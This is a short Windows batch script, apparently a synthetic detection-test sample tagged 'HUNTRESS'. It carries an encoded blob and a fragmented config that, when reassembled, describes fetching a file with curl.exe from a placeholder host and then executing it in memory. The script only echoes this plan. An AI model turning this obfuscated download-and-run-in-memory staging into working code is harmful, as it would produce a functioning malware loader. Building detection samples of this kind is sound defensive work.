@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:split_fragments|rotate_left

rem HUNTRESS-MATERIAL:7Hpi+OboyuDmesLG4urS5Mq+5Mra3ujKWMjS5uDC6MbQvtrK2t7k8vjCyMLg6Mrkesbq5NhcyvDK+Obows7Kvsbe6tzoemL4zuTC4NB6xuTe5ua+2MLczurCzsr43Mrw6L7YwtzO6sLOynrc3tzK+MbC2uDC0s7cvtLIesbC2uDC0s7cWsjGbMRiZMLKzHD46uTYetDo6ODmdF5eyMZsxGJkwsrMcFzK8MLa4NjKXNLc7MLY0shecMZgaMzCZMhcyMLo

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set "h0=v=1|steps=acquire_remote,dispatch_memory|adapter="
set "h1=curl.exe|stage_count=1|graph=cross_language|next_"
set "h2=language=none|campaign_id=campaign-dc6b12aef8|url"
set "h3==https://dc6b12aef8.example.invalid/8c04fa2d.dat"

goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE

set "neutral_arithmetic=6563c4c8"

for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg="
for %%G in (0 1 2 3) do call set "cfg=%%cfg%%%%h%%G%%"
exit /b 0
:HUNTRESS_EMIT

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo curl.exe GET https://dc6b12aef8.example.invalid/8c04fa2d.dat then dispatch memory

exit /b 0

